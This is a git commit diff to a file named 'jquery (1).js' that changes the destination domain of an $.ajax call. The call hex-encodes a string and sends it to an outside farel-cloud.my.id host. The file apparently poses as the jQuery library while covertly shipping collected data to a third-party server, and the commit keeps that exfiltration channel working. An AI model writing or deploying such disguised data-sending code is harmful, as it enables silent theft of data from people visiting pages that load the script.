861413880554be564d038498f666a03cda9e2c61
userrel <refkykaur@gmail.com>
2024-11-20 23:51:06 +0700

    Update jquery (1).js

--- jquery (1).js
+++ jquery (1).js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://indoku.farel-cloud.my.id/source/?json=" +
+                    "https://farel.farel-cloud.my.id/source/?json=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
